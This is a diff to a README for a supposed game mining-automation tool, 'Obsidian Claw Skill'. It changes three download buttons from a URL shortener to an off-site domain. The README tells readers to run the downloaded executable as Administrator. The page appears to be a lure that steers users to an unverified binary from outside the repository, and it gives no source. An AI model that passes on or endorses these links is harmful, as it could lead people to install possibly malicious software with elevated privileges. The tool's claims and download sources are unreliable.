@@ -9,7 +9,7 @@ The **⛏️ Obsidian Claw Skill** is a specialized automation tool designed for
 
 <div align="center">
 
-[![Download Obsidian Claw Skill](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/obsidian-claw-skill)
+[![Download Obsidian Claw Skill](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/obsidian-claw-skill)
 
 </div>
 
@@ -82,7 +82,7 @@ Mining and gathering resources in games takes too much time. Clicking the same n
 3. **🖱️ Run as Administrator** — `ObsidianClawSkill.exe`
 4. **🚀 Launch the tool**
 
-[![Download Obsidian Claw Skill](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/obsidian-claw-skill)
+[![Download Obsidian Claw Skill](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/obsidian-claw-skill)
 
 ### Interface Overview
 
@@ -192,7 +192,7 @@ Mine faster, gather smarter. **Obsidian Claw Skill** helps you optimize resource
 
 <div align="center">
 
-[![Download Obsidian Claw Skill](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/obsidian-claw-skill)
+[![Download Obsidian Claw Skill](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/obsidian-claw-skill)
 
 **Version 1.8.0** — Mining automation tool. Free forever.
 
